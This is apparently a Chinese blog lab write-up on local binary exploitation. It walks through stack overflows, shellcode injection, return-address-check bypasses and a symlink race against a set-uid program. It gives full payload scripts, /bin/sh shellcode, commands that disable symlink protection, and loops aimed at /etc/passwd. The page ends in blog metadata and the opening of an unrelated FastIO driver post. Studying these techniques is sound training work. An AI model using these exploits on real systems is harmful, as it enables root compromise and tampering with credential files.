call指令的内部细节为：将下一条指令的地址压入栈中，然后跳转到函数B去执行代码。这里说的call下一条指令的地址也就是通常所说的返回地址。函数B最后一条retn指令会从栈上弹出返回地址，并赋值给EIP寄存器，达到返回函数A继续执行的目的。 基本的缓冲区溢出攻击通常是通过改写函数返回地址的形式来发起攻击的。如A调用B函数，正常情况下B函数返回时执行retn指令，从栈上取出返回地址跳转回A函数继续执行代码。而一旦返回地址被缓冲区溢出数据改写，那么我们就可以控制函数B跳转到指定的地方去执行代码了。 主机&#x2F;home&#x2F;test&#x2F;5目录下有一个pwn5程序，执行这个程序可以输入数据进行测试，正常情况下程序接收输入数据后不会产生任何输出信息并直接退出，然后当输入一定的数据量时，可能会提示Segmentation fault的错误信息，当输入的精心构造的输入数据时可对程序发起溢出攻击，达到改写程序执行流程的目的，攻击成功时将输出如下信息： Congratulations, you pwned it. 源代码 123456789101112131415161718192021#include &lt;stdio.h&gt;void win()&#123; printf(&quot;Congratulations, you pwned it.\\n&quot;);&#125; int main(int argc, char** argv)&#123; char buffer[64]; gets(buffer); // 存在缓冲区溢出 return 0;&#125; 程序定义了一个64字节大小的buffer数组，然后使用gets获取输入数据，我们知道gets是不安全的函数，这里会引发缓冲区溢出，栈上函数的返回地址可以被改写，当返回地址被改写为win函数的地址时，就可以输出成功提示的信息。 返回地址覆盖利用gdb调试，查看主函数汇编 显然在0x08048408存在溢出漏洞 首先使用b *0x080483f8对main函数的第一条指令下一个断点，同时使用b *0x08048408对gets函数的调用下一个断点，然后输入r命令运行程序，将会在第一个断点处断下 查看esp寄存器的值 1i r $esp 这时候esp寄存器的值为0xffffd6cc。按C继续执行，在第二个断点断下，通过对汇编指令的分析，我们知道eax寄存器存储了buffer的起始地址，所以运行i r $eax来查看buffer的地址： 我们看到eax寄存器的值为0xffffd680，那么这两个地址的差为76，如下图下图所示： 也就是说，在覆盖了76字节数据后，如果再覆盖4个字节，就可以把返回地址覆盖为我们想要的地址了。 在gdb中执行disas win查看win函数的地址为0x080483e4，或者objdump。接下来就可以构造输入数据来发起溢出攻击了。 通过上面的步骤我们已经知道，只要合理控制输入数据的第77~80字节的内容，就可以实现对函数返回地址进行覆盖，从而成功发起溢出攻击了。 现在win函数的地址为0x080483e4，转换为小端格式就是’\\xe4\\x83\\x04\\x08’，那么可以构造这样的命令来进行溢出测试： 1python -c &quot;print &#x27;A&#x27;*76+&#x27;\\xe4\\x83\\x04\\x08&#x27;&quot; | ./pwn5 环境变量继承背景在Linux&#x2F;Windows操作系统中, 每个进程都有其各自的环境变量设置。 缺省情况下, 当一个进程被创建时，除了创建过程中的明确更改外，它继承了其父进程的绝大部分环境变量信息。 扩展的C语言main函数可以传递三个参数，除了argc和argv参数外，还能接受一个char**类型的envp参数。envp指向一个字符串数组，该数组存储了当前进程具体的环境变量的内容，envp的最后一个元素指向NULL，此为envp结束的标识符。 打印环境变量参数信息的示例代码： 1234567891011#include &lt;stdio.h&gt;int main(int argc,char** argv,char** envp)&#123; int i =0; while(envp[i]) &#123; printf(&quot;envp[%2d] = %s\\n&quot;, i, envp[i]); i +=1; &#125; return 0;&#125; 编译这段代码生成env程序，然后在命令行下执行，可以看到程序打印出了具体的环境变量参数信息： 环境变量的格式为：环境变量名&#x3D;环境变量值 当父进程启动一个子进程时，子进程会继承父进程的环境变量信息。在Linux Shell下，通过export可以给Shell添加一个环境变量，此后通过Shell启动的子进程都会拥有这个环境变量。 在Shell中执行export testenv&#x3D;”Hello_World”之后，再执行.&#x2F;env，可以看到新的环境变量已经被子进程继承了。 Python的os模块提供创建子进程以及修改环境变量的函数，其中os.system函数可以创建一个子进程，且子进程会继承父进程的环境变量参数信息；os.putenv可以修改进程的环境变量参数信息。 Linux Shell中，可以使用$()或者两个反引号（&#96; ）来包裹一条shell命令，并返回shell命令的执行结果。 比如执行 1export testenv2=`python -c &quot;print &#x27;A&#x27;*20&quot;` 命令后，再执行.&#x2F;env可以看到有一个名为testenv2的环境变量，其值为20个A。 主机&#x2F;home&#x2F;test&#x2F;3目录下有一个pwn3程序，这个程序会对进程中名为HEETIAN的环境变量的值进行处理，通过构造特定的环境变量参数数据可以对程序发起溢出攻击，成功会提示Congratulations, you pwned it.，失败则会提示Please try again.的提示信息。注意：如果没有设置HEETIAN这个环境变量，那么运行程序后将输出Please set the HEETIAN environment variable，之后程序自动退出。 源代码： 1234567891011121314151617181920212223242526272829#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;int main(int argc,char** argv)&#123; int modified; char buffer[64]; char* variable; variable = getenv(&quot;HEETIAN&quot;);// 获取环境变量HEETIAN的值 if(variable ==NULL) &#123; printf(&quot;Please set the HEETIAN environment variable\\n&quot;); exit(1); &#125; modified =0; strcpy(buffer, variable);// 调用strcpy进行字符串复制，可引发缓冲区溢出 if(modified ==0x0d0a0d0a)// 判断modified的值是否为0x0d0a0d0a &#123; printf(&quot;Congratulations, you pwned it.\\n&quot;); &#125; else &#123; printf(&quot;Please try again, you got 0x%08X\\n&quot;, modified); &#125; return 0;&#125; 环境变量继承程序首先通过getenv函数获取名为HEETIAN的环境变量参数，然后使用strcpy函数将其值复制到buffer缓冲区中，我们知道这样可以引发缓冲区溢出。 这里当设置超长的环境变量参数数据时，将会产生缓冲区溢出，数据覆盖buffer后会继续覆盖modified变量。 使用gdb调试并查看主函数反汇编 1234567891011121314151617181920212223242526272829303132333435363738390x0804848d &lt;+9&gt;: movl $0x80485d4,(%esp); 调用getenv获取环境变量HEETIAN的值0x08048494 &lt;+16&gt;: call 0x8048364 &lt;getenv@plt&gt;; 将结果保存到variable变量，即[esp+0x5c]0x08048499 &lt;+21&gt;: mov %eax,0x5c(%esp); 判断返回结果是否为NULL0x0804849d &lt;+25&gt;: cmpl $0x0,0x5c(%esp)0x080484a2 &lt;+30&gt;: jne 0x80484bc &lt;main+56&gt; ......; 初始化modified变量的值为0，位于[esp+0x58]0x080484bc &lt;+56&gt;: movl $0x0,0x58(%esp); 调用strcpy对buffer进行填充，位于[esp+0x18]0x080484c4 &lt;+64&gt;: mov 0x5c(%esp),%eax0x080484c8 &lt;+68&gt;: mov %eax,0x4(%esp)0x080484cc &lt;+72&gt;: lea 0x18(%esp),%eax0x080484d0 &lt;+76&gt;: mov %eax,(%esp)0x080484d3 &lt;+79&gt;: call 0x8048384 &lt;strcpy@plt&gt;; 判断modified变量的值是否为0x0d0a0d0a0x080484d8 &lt;+84&gt;: cmpl $0xd0a0d0a,0x58(%esp) ...... 通过对上面的汇编代码进行分析，我们知道buffer位于esp+0x18处，而modified位于esp+0x58处，两个地址的距离为0x58 - 0x18 &#x3D; 0x40，即64，刚好为buffer数组的大小。因此当环境变量HEETIAN的值的数据超过64字节时，modified变量就可以被覆盖，但需要控制modified变量的值还需要小心的构造数据。我们只要合理控制环境变量参数的第65~68字节的内容，就可以成功发起溢出攻击了。 因为目标机器采用小端格式存储数据，而if语句分支要求modified的值为0x0d0a0d0a时才通过判断，因此我们构造的数据应该为\\x0a\\x0d\\x0a\\x0d。下面通过两种不同的方法来修改环境变量以达到攻击效果。 方法一：通过export修改环境变量 前面已经介绍过通过export可以修改环境变量，执行下面的语句： 1export HEETIAN=$(python -c &quot;print &#x27;A&#x27;*64+&#x27;\\x0a\\x0d\\x0a\\x0d&#x27;&quot;) 然后运行.&#x2F;pwn3就可以看到攻击效果了，如图所示： 方法二：通过python脚本动态修改环境变量 12345678import osdef pwn(): os.putenv(&quot;HEETIAN&quot;,&quot;A&quot;*64+&quot;\\x0a\\x0d\\x0a\\x0d&quot;) os.system(&quot;./pwn3&quot;) if __name__ ==&quot;__main__&quot;: pwn() 为了排除前面的环境变量的干扰，我们先修改HEETIAN的的值为AAA，然后再执行python脚本，可以看到攻击效果，如图所示： 执行Shellcode背景 Shellcode指缓冲区溢出攻击中植入进程的恶意代码，这段代码可以弹出一个消息框，也可以在目标机器上打开一个监听端口，甚至是删除目标机器上的重要文件等。 Shellcode通常需要使用汇编语言进行开发，并转换成二进制机器码，其内容和长度经常还会受到很多实际条件的限制，因此开发Shellcode通常都是非常困难的。在实际场景中，我们通常使用Metasploit这个工具来定制各种功能的Shellcode，当然也可以去网上查找一些现有的Shellcode进行测试，通常在shell-storm以及exploit-db等网站上都能找到一些比较成熟和稳定的shellcode，网址为： http://shell-storm.org/shellcode/ http://www.exploit-db.com/shellcode/ 在缓冲区溢出攻击中，如何执行我们的Shellcode呢？我们一般通过输入数据来将Shellcode传递给目标进程，我们已经知道了如何改写函数的返回地址，那么我们可以让程序跳转到栈上的Shellcode去执行，那么就达到了执行Shellcode的目的了。 一种可行的方案如下图所示： 我们将Shellcode填充到返回地址以上的栈空间中，然后将返回地址改写为Shellcode的起始地址，这样在执行retn指令的时候，就相当于跳转到Shellcode去执行了。 主机&#x2F;home&#x2F;test&#x2F;6目录下有一个pwn6程序，执行这个程序可以输入数据进行测试，正常情况下程序接收输入数据后不会产生任何输出信息并直接退出，然而当输入一定的数据量时，可能会提示Segmentation fault的错误信息，当输入的精心构造的输入数据时可对程序发起溢出攻击，达到执行Shellcode的目的。下面这段Shellcode用于执行&#x2F;bin&#x2F;bash： 1\\xeb\\x12\\x31\\xc9\\x5e\\x56\\x5f\\xb1\\x15\\x8a\\x06\\xfe\\xc8\\x88\\x06\\x46\\xe2\\xf7\\xff\\xe7\\xe8\\xe9\\xff\\xff\\xff\\x32\\xc1\\x32\\xca\\x52\\x69\\x30\\x74\\x69\\x01\\x69\\x30\\x63\\x6a\\x6f\\x8a\\xe4\\xb1\\x0c\\xce\\x81 源码： 1234567#include &lt;stdio.h&gt;int main(int argc, char** argv)&#123; char buffer[64]; gets(buffer); return 0;&#125; 程序定义了一个64字节大小的buffer数组，然后使用gets获取输入数据，我们知道gets是不安全的函数，这里会引发缓冲区溢出，栈上函数的返回地址可以被改写，我们可以输入Shellcode来覆盖栈上的数据，然后通过改写函数返回地址为Shellcode的起始地址来达到执行Shellcode的目的。 执行Shell Code使用gdb调试，查看主函数反汇编 在程序入口和gets函数下断点，查看程序入口esp和调用前eax的值。前者是栈底返回地址处，后者是传入的参数，即buffer 0xffffd6cc - 0xffffd680，那么这两个地址的差为76，如下图下图所示： 也就是说，在覆盖了76字节数据后，如果再覆盖4个字节，就可以把返回地址覆盖为我们想要的地址了。在返回地址数据之后，我们使用Shellcode来覆盖栈上的内容。从上图中可以看出，Shellcode的起始地址应为0xffffd6cc+4 &#x3D; 0xffffd6d0。 在gdb调试器下调试pwn6程序时，只要合理控制输入数据的第77~80字节的内容，就可以实现对函数返回地址进行覆盖，我们可以将返回地址填充为0xffffd6d0来实现执行Shellcode的目的。我们对输入数据的构造的布局如下： 创建一个python脚本 123456789shellcode = (&quot;\\xeb\\x12\\x31\\xc9\\x5e\\x56\\x5f\\xb1\\x15\\x8a\\x06\\xfe&quot; + &quot;\\xc8\\x88\\x06\\x46\\xe2\\xf7\\xff\\xe7\\xe8\\xe9\\xff\\xff&quot; + &quot;\\xff\\x32\\xc1\\x32\\xca\\x52\\x69\\x30\\x74\\x69\\x01\\x69&quot; + &quot;\\x30\\x63\\x6a\\x6f\\x8a\\xe4\\xb1\\x0c\\xce\\x81&quot;)print &#x27;A&#x27;*76 + &#x27;\\xd0\\xd6\\xff\\xff&#x27; + shellcode 在Shell下执行python pwn6.py &gt; test将输出数据写入test文件，然后再次使用gdb调试pwn6程序，gdb载入pwn6程序后，执行r &lt; test命令，表示将test文件的数据当做输入数据传给pwn6程序，可以看到Shellcode成功执行，新创建了一个&#x2F;bin&#x2F;bash进程： 理论上来说，在shell中执行.&#x2F;pwn6 &lt; test也是可以成功溢出的，但是由于在gdb下和实际情况下栈的基地址不一样，因此实际上在shell中执行.&#x2F;pwn6 &lt; test会提示Segmentation fault。 绕过返回地址限制背景_builtin_return_address函数接收一个参数，可以是0,1,2等。__builtin_return_address(0)返回当前函数的返回地址，如果参数增大1，那么就往上走一层获取主调函数的返回地址。 retn指令从栈顶弹出一个数据并赋值给EIP寄存器，程序继续执行时就相当于跳转到这个地址去执行代码了。如果我们将返回地址覆盖为一条retn指令的地址，那么就又可以执行一条retn指令了，相当于再在栈顶弹出一个数据赋值给EIP寄存器。 主机&#x2F;home&#x2F;test&#x2F;7目录下有一个pwn7程序，执行这个程序可以输入数据进行测试，正常情况下程序接收输入数据后会产生对应的输出信息并直接退出，然而当输入一定的数据量时，可能会提示bzzzt的错误信息，当输入的精心构造的输入数据时可对程序发起溢出攻击，达到执行Shellcode的目的。下面这段Shellcode用于执行&#x2F;bin&#x2F;bash： 1\\xeb\\x12\\x31\\xc9\\x5e\\x56\\x5f\\xb1\\x15\\x8a\\x06\\xfe\\xc8\\x88\\x06\\x46\\xe2\\xf7\\xff\\xe7\\xe8\\xe9\\xff\\xff\\xff\\x32\\xc1\\x32\\xca\\x52\\x69\\x30\\x74\\x69\\x01\\x69\\x30\\x63\\x6a\\x6f\\x8a\\xe4\\xb1\\x0c\\xce\\x81 直接覆盖返回地址跳转到Shellcode执行是不行的，程序对返回地址进行了一点限制，绕过对返回地址的保护限制，以达到执行特定Shellcode的目的。 123456789101112131415161718192021222324252627#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;void getpath()&#123; char buffer[64]; unsigned int ret; printf(&quot;input path please: &quot;); fflush(stdout); gets(buffer); ret = __builtin_return_address(0); if ((ret &amp; 0xbf000000) == 0xbf000000) &#123; printf(&quot;bzzzt (%p)\\n&quot;, ret); _exit(1); &#125; printf(&quot;got path %s\\n&quot;, buffer);&#125; int main(int argc, char** argv)&#123; getpath(); return 0;&#125; getpath函数中定义了一个64字节大小的buffer数组，然后使用gets获取输入数据，我们知道gets是不安全的函数，这里会引发缓冲区溢出，栈上函数的返回地址可以被改写。但是也可以看到这里对返回地址和0xbf000000进行与操作，如果高位字节是0xbf的话，那么程序就会退出。 多层跳转绕过返回地址限制使用gdb调试并查看主函数反汇编 对感兴趣的区域下上断点，观察返回地址和buffer地址 有：0xffffd6bc - 0xffffd66c，那么这两个地址的差为80。 也就是说，在覆盖了80字节数据后，如果再覆盖4个字节，就可以把返回地址覆盖为我们想要的地址了。现在因为对返回地址进行了限制，我们显然不能直接跳转到栈上执行代码，因为这里Shellcode的地址的最高字节为0xff，有0xff &amp; 0xbf &#x3D;&#x3D; 0xbf，因此无法通过保护限制。 这里采用两次跳转的方法来突破这个限制。 我们可以将一条retn指令的地址来覆盖函数的返回地址，比如getpath的最后一条指令为： 0x080484e9 &lt;+117&gt;: ret 那么，0x080484e9 &amp; 0xbf000000 &#x3D; 0x08000000，可以绕过保护限制，我们让这条retn指令执行时，从栈上取到的数据为Shellcode的地址，就可以执行Shellcode了。那么，我们构造的输入数据应该是这样的： 通过上面的步骤我们已经知道，在gdb调试器下调试pwn7程序时，只要合理控制输入数据的第81~84字节的内容，就可以实现对函数返回地址进行覆盖，我们可以将返回地址填充为0x080484e9来实现执行一条retn指令。 同时，我们将第85~88字节覆盖为Shellcode的地址。即0xffffd6bc+4+4 &#x3D; 0xffffd6c4，我们对输入数据的构造的布局如下： 在&#x2F;home&#x2F;test&#x2F;7目录下有一个pwn7.py的Python脚本，其源代码如下： 123456789shellcode = (&quot;\\xeb\\x12\\x31\\xc9\\x5e\\x56\\x5f\\xb1\\x15\\x8a\\x06\\xfe&quot; + &quot;\\xc8\\x88\\x06\\x46\\xe2\\xf7\\xff\\xe7\\xe8\\xe9\\xff\\xff&quot; + &quot;\\xff\\x32\\xc1\\x32\\xca\\x52\\x69\\x30\\x74\\x69\\x01\\x69&quot; + &quot;\\x30\\x63\\x6a\\x6f\\x8a\\xe4\\xb1\\x0c\\xce\\x81&quot;)print &#x27;A&#x27;*80 + &#x27;\\xe9\\x84\\x04\\x08&#x27; + &#x27;\\xc4\\xd6\\xff\\xff&#x27; + shellcode 在Shell下执行python pwn7.py &gt; test将输出数据写入test文件，然后再次使用gdb调试pwn7程序，gdb载入pwn7程序后，执行r &lt; test命令，表示将test文件的数据当做输入数据传给pwn7程序，可以看到Shellcode成功执行，新创建了一个&#x2F;bin&#x2F;bash进程： 通用跳转技术strdup可以用于复制一个字符串，我们通常使用字符串时会使用strcpy，这要求已经定义好了一个接收缓冲区。而strdup只接受一个参数，也就是要复制的字符串的地址，strdup()会先用maolloc()配置与参数字符串相同大小的的空间，然后将参数字符串的内容复制到该内存地址，然后把该地址返回。strdup返回的地址最后可以利用free()来释放。 当输出信息非常多的时候，我们很难快速找到我们感兴趣的信息。使用grep命令可以对匹配特定正则表达式的文本进行搜索，并只输出匹配的行或文本。 我们可以使用管道将一个程序的输出当做grep的输入数据，grep会根据给定的正则表达式参数对输入数据进行过滤。 对于grep的参数需要注意这样一个问题：当参数中存在空格时需要用双引号将参数包裹起来，此外，* 是正则表达式里面的通配符，如果要查找 ，需要使用反斜杠进行转移，即 \\ 。 主机&#x2F;home&#x2F;test&#x2F;8目录下有一个pwn8程序，执行这个程序可以输入数据进行测试，正常情况下程序接收输入数据后会产生对应的输出信息并直接退出，然而当输入一定的数据量时，可能会提示bzzzt的错误信息，当输入的精心构造的输入数据时可对程序发起溢出攻击，达到执行Shellcode的目的。下面这段Shellcode用于执行&#x2F;bin&#x2F;sh： 1\\xeb\\x1f\\x5e\\x89\\x76\\x08\\x31\\xc0\\x89\\x46\\x0c\\x88\\x46\\x07\\xb0\\x0b\\x89\\xf3\\x8d\\x4e\\x08\\x8d\\x56\\x0c\\xcd\\x80\\x31\\xdb\\x89\\xd8\\x40\\xcd\\x80\\xe8\\xdc\\xff\\xff\\xff/bin/sh 除了绕过对返回地址的限制保护之外，还可以使用更加高级的通用跳转技术来执行Shellcode。 源代码： 1234567891011121314151617181920212223242526272829#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt; char* getpath()&#123; char buffer[64]; unsigned int ret; printf(&quot;input path please:&quot;); fflush(stdout); gets(buffer); ret = __builtin_return_address(0); if ((ret &amp; 0xb0000000) == 0xb0000000) &#123; printf(&quot;bzzzt (%p)\\n&quot;, ret); _exit(1); &#125; printf(&quot;got path %s\\n&quot;, buffer); return strdup(buffer);&#125;int main(int argc, char** argv)&#123; getpath(); return 0;&#125; getpath函数中定义了一个64字节大小的buffer数组，然后使用gets获取输入数据，我们知道gets是不安全的函数，这里会引发缓冲区溢出。在程序的末尾调用了strdup对buffer缓冲区中存储的字符串进行复制，并返回了新的缓冲区副本的地址。 通用跳转技术使用gdb调试pwn8 下断点，获取返回地址和eax地址 上图中红色线条框起来的就是我们执行的gdb命令，粉红色线条框起来的是我们下断点的地址，蓝色线条框起来的是我们想要查看的两个寄存器的值，有： 0xffffd6bc - 0xffffd66c，那么这两个地址的差为80。 也就是说，在覆盖了80字节数据后，如果再覆盖4个字节，就可以把返回地址覆盖为我们想要的地址了。 现在关注一下函数末尾的几条汇编指令，如下： 1234567890x08048518 &lt;+116&gt;: lea -0x4c(%ebp),%eax0x0804851b &lt;+119&gt;: mov %eax,(%esp)0x0804851e &lt;+122&gt;: call 0x80483d8 &lt;strdup@plt&gt;0x08048523 &lt;+127&gt;: leave0x08048524 &lt;+128&gt;: ret 我们发现程序调用了strdup对输入数据进行复制，然后把新分配的空间的地址返回。在汇编语言中，函数的返回值存储于eax寄存器中，可以在gdb中实际验证一下： 在0x08048523下一个断点，然后输入c继续执行，输入数据后，断点将会断下，这时候通过执行x &#x2F;s $eax命令，看到了我们复制的数据。既然eax寄存器指向复制后的buffer，如果我们将函数的返回地址覆盖为call *%eax这样的指令的地址，那么Shellcode就可以被执行了。可以尝试找到这样的一条指令。 我们知道通过objdump -d pwn8可以查看pwn8中的汇编指令，而grep可以对指令进行过滤，那么可以在Shell中执行objdump -d pwn8 | grep “call **%eax”来找到我们需要的指令： 通过上面的步骤我们已经知道，可以将getpath函数的返回地址覆盖为0x0804849f，就可以执行call *%eax了。这里我们需要将Shellcode布局到buffer的最前面，shellcode与返回地址之间不足的数据可以用A来填充，我们对输入数据的构造的布局如下： 编写python脚本，填充 123456789shellcode = (&quot;\\xeb\\x1f\\x5e\\x89\\x76\\x08\\x31\\xc0\\x89\\x46\\x0c\\x88\\x46&quot; + &quot;\\x07\\xb0\\x0b\\x89\\xf3\\x8d\\x4e\\x08\\x8d\\x56\\x0c\\xcd\\x80&quot; + &quot;\\x31\\xdb\\x89\\xd8\\x40\\xcd\\x80\\xe8\\xdc\\xff\\xff\\xff/bin/sh&quot;)junk = (80-len(shellcode))*&#x27;A&#x27;print shellcode + junk + &#x27;\\x9f\\x84\\x04\\x08&#x27; 在Shell下执行python pwn8.py &gt; test将输出数据写入test文件，然后再次使用gdb调试pwn8程序，gdb载入pwn8程序后，执行r &lt; test命令，表示将test文件的数据当做输入数据传给pwn8程序，可以看到Shellcode成功执行，新创建了一个&#x2F;bin&#x2F;bash进程： 竟态条件漏洞背景竞态条件（race condition），从多进程间通信的角度来讲，是指两个或多个进程对共享的数据进行读或写的操作时，最终的结果取决于这些进程的执行顺序。 在ubuntu的11.04或者12.04版本默认配置已经开启了对竞态条件漏洞的保护策略。这个保护策略严格限制了在什么情况下可以去跟踪操作一个符号链接指向的文件。帮助文档中对这个策略是这么描述的：“在所有人都可写的目录（比如说&#x2F;tmp目录）中存在的符号链接，被链接的文件与目录与符号链接的创建者不同时，被链接的文件不可以被操作”。简单举例来帮助大家理解一下：在&#x2F;tmp目录下有一个软连接&#x2F;tmp&#x2F;abc指向&#x2F;etc&#x2F;shadow，而这个软连接是test用户（uid为1000）的用户创建。那么，任何情况下都无法通过这个软连接来修改&#x2F;etc&#x2F;shadow文件。 如果实验在ubuntu12.04版本进行，则需要关掉这个防护功能。以下两种方法都可以关闭此配置。 1)$ sudo sysctl -w kernel.yama.protected_sticky_symlinks&#x3D;0 2)$ sudo echo 0 &gt; &#x2F;proc&#x2F;sys&#x2F;fs&#x2F;protected_symlinks 本次实验在ubuntu 16.04环境下进行，命令为 $ sudo sysctl -w fs.protected_symlinks&#x3D;0 一个看起来很正常的程序但是却存在竞态条件漏洞的程序，源码如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243/* vulp.c */ #include &lt;stdio.h&gt; #include &lt;unistd.h&gt; int main() &#123; char * fn = &quot;/tmp/XYZ&quot;; char buffer[60]; FILE *fp; /* get user input */ scanf(&quot;%50s&quot;, buffer ); if(!access(fn, W_OK))&#123; fp = fopen(fn, &quot;a+&quot;); fwrite(&quot;\\n&quot;, sizeof(char), 1, fp); fwrite(buffer, sizeof(char), strlen(buffer), fp); fclose(fp); &#125; else printf(&quot;No permission \\n&quot;); &#125; 这个程序是一个set-uid程序（文件属主是root），这个程序的功能是将用户的输入，追加到&#x2F;tmp&#x2F;XYZ这个文件。因为程序是拥有root权限，因此在写入操作之前，我们看到程序使用了access函数来检查是否对&#x2F;tmp&#x2F;XYZ文件拥有写入的权限。access()函数用来检查执行程序的用户是否拥有对&#x2F;tmp&#x2F;XYZ文件的写入权限。 这个过程看起来很完美，用户拥有写入权限时，执行写入操作，用户没有写入权限时不执行操作。然而这个代码的流程却存在竞态条件漏洞。我们假设这样一种情况，&#x2F;tmp&#x2F;XYZ是个软连接，原本指向&#x2F;home&#x2F;test&#x2F;race&#x2F;testfile（文件属主是test用户）,然而access()函数的执行与fopen()函数的执行之间，时间间隔非常长，当test用户运行此程序且access()函数执行之后，&#x2F;tmp&#x2F;XYZ软连接文件被test用户修改，指向了&#x2F;etc&#x2F;shadow（属主是root，其他用户无权限修改）。那么fopen()函数的对象，则变成了&#x2F;etc&#x2F;shadow，攻击者可以成功的向&#x2F;etc&#x2F;shadow文件追加任意内容（程序本身是setuid程序，可以修改&#x2F;etc&#x2F;shadow）。 这个漏洞从理论上是存在的，然而，我们知道access()和fopen()之间的时间间隔非常短，如何成功的利用这个竞态条件漏洞呢？由于我们使用普通用户，无法修改vulp程序的代码，所以只能变换思路，多次执行vulp程序，并且反复修改&#x2F;tmp&#x2F;XYZ文件的软连接指向的文件。 利用竟态条件漏洞利用此漏洞，我们可以达到下面2种效果： 1.向任意属主为root的文件追加内容 2.获取root权限 在&#x2F;home&#x2F;test&#x2F;race&#x2F;目录下有一个文件rootfile，属主是root。 要利用这个漏洞，有这么几个要素： 1.&#x2F;tmp&#x2F;XYZ软连接指向的文件不停在属主test和root用户之间切换。 2.漏洞程序要反复多次执行。 3.漏洞被利用一次之后程序要停止，以免多次写入。 对于要素1，我们可以写一个简单的程序，attack.c和testfile attack.c： 12345678int main() &#123; while(1)&#123; system(&quot;ln -sf /home/test/race/testfile /tmp/XYZ&quot;); system(&quot;ln -sf /home/test/race/rootfile /tmp/XYZ&quot;); &#125; return 0; &#125; 从代码中，我们可以看到，attack这个程序修改&#x2F;tmp&#x2F;XYZ这个软连接所指向的目标文件在testfile和rootfile之间来回切换。 对于要素三，我们可以写一个脚本来实现确保写入一次。因为写入一次之后，文件的时间戳会改变，因为我们通过检测rootfile的时间戳来判断是否写入成功。脚本check.sh代码如下： 1234567891011#!/bin/sh old=`ls -l /home/test/race/rootfile` new=`ls -l /home/test/race/rootfile` while [ &quot;$old&quot; = &quot;$new&quot; ] do ./vulp &lt; contents_to_append new=`ls -l /home/test/race/rootfile` done echo &quot;STOP... The root file has been changed&quot; 从上面代码中我们可以发现，要素二也满足了，我们通过.&#x2F;vulp &lt; contents_to_append来反复执行vulp程序，并且通过重定向来向程序输入我们要追加的内容。 至此，我们完成攻击所需要的准备步骤都完成了，看一下&#x2F;home&#x2F;test&#x2F;race目录都有哪些文件： rootfile属主是root，是我们要修改的目标文件。 testfile属主是test，用来确保通过access()函数的权限检查 vulp是set-uid程序属主是root，是存在竞态条件漏洞的程序 contents_to_append属主是test，是我们要向rootfile追加的内容，可以任意修改 check.sh属主是test，用来反复执行vulp程序并且确保rootfile只修改一次。 登录实验机，切换到test用户。查看rootfile文件夹，为空。 在执行vulp程序之前，先运行我们的attack程序。 运行check.sh，耐心等待攻击过程完成。 当check.sh结束并打印stop…the root file has been changed时，攻击完成。 此时cat rootfile，发现写入新内容。可以killall attack关闭程序。 保护方法保护机制A：重复检查权限。想要避免竞态条件的发生并不容易，先检查再访问这个模式在很多程序中都是存在。比起想办法移除漏洞，不如换个思路，我们可以增加更多的竞态条件，这样就能减小攻击者攻击成功的概率了。 123456789101112131415161718192021if(!access(fn, W_OK))&#123; if(!access(fn, W_OK))&#123; /*嵌套n层*/ fp = fopen(fn, &quot;a+&quot;); fwrite(&quot;\\n&quot;, sizeof(char), 1, fp); fwrite(buffer, sizeof(char), strlen(buffer), fp); fclose(fp); &#125; else printf(&quot;No permission \\n&quot;);&#125;else printf(&quot;No permission \\n&quot;); 保护机制B：最小权限原则 该程序的根本问题就在于它违反了最小权限原则，程序员认识到运行这个程序的用户可能权利过大，所以引入access函数进行限制，但也同时引入了竞态条件的隐患。更好的方法是使用seteuid系统调用暂时禁止root权限，当需要时再恢复。 123456789101112131415161718192021222324252627282930313233343536373839int main() &#123; char * fn = &quot;/tmp/XYZ&quot;; char buffer[60]; FILE *fp; /* get user input */ scanf(&quot;%50s&quot;, buffer ); uid_t euid = geteuid(); seteuid(getuid()); if (fp = fopen(fn, &quot;a+&quot;))&#123; fwrite(&quot;\\n&quot;, sizeof(char), 1, fp); fwrite(buffer, sizeof(char), strlen(buffer), fp); fclose(fp); &#125; else printf(&quot;No permission \\n&quot;); seteuid(euid); &#125; 使用test用户利用此漏洞获取root权限： 利用漏洞在 &#x2F;etc&#x2F;passwd 和 &#x2F;etc&#x2F;shadow 后追加信息。这两个文件是unix做用户授权用的，攻击者有可能利用这点创建用户，甚至是超级用户。 12345678910111213141516171819/* attack.c */#include &lt;unistd.h&gt;int main()&#123; while(1) &#123; unlink(&quot;/tmp/XYZ&quot;); symlink(&quot;/dev/null&quot;,&quot;/tmp/XYZ&quot;); usleep(1000); unlink(&quot;/tmp/XYZ&quot;); symlink(&quot;/etc/passwd&quot;,&quot;/tmp/XYZ&quot;); usleep(1000); &#125; return 0;&#125;//gcc attack.c -o attack","categories":[{"name":"PWN","slug":"PWN","permalink":"https://qianmuoy.github.io/categories/PWN/"}],"tags":[]},{"title":"过滤FastIO","slug":"过滤FastIO","date":"2024-03-09T12:32:03.000Z","updated":"2024-03-09T12:32:24.289Z","comments":true,"path":"2024/03/09/过滤FastIO/","link":"","permalink":"https://qianmuoy.github.io/2024/03/09/%E8%BF%87%E6%BB%A4FastIO/","excerpt":"","text":"过滤FastIO过滤驱动就是挂载在一般驱动，比如磁盘驱动上，拦截IRP、FastIO请求，并有选择的过滤。 FastIO和IRP类似，一般比IRP要复杂，如果对FastIO全部拒绝，可以让驱动走IRP，这也是一般的过滤方法。 遍历FSD驱动派遣函数与Hook检测 - 知乎 (zhihu.com) FSD(File System Drivers)位于系统底层，是和磁盘驱动最近的地方。它平时存在感不强，但由于本身身处要地，所以经常被各种恶意程序、安全软件以及其他怀有各种纯洁和不纯洁目的的应用盯上。 初始化FastIO派遣例程在wdm中有对FAST_IO_DISPATCH的定义，申请一个这样的结构，并填充其中的内容 1234567891011121314151617181920212223242526272829303132333435363738int InitializeFastIo( FAST_IO_DISPATCH** FastIoDispatch) //这是一个二维指针 &#123; //申请一个结构指针 FAST_IO_DISPATCH* v5 = NULL; v5 = (PFAST_IO_DISPATCH)ExAllocatePool(NonPagedPool, sizeof(FAST_IO_DISPATCH)); if (v5 == NULL) return -1; RtlZeroMemory(v5, sizeof(FAST_IO_DISPATCH)); v5-&gt;SizeOfFastIoDispatch = sizeof(FAST_IO_DISPATCH); v5-&gt;FastIoCheckIfPossible = FastIoCheckIfPossible; v5-&gt;FastIoRead = FastIoRead; v5-&gt;FastIoWrite = FastIoWrite; v5-&gt;FastIoQueryBasicInfo = FastIoQueryBasicInfo; 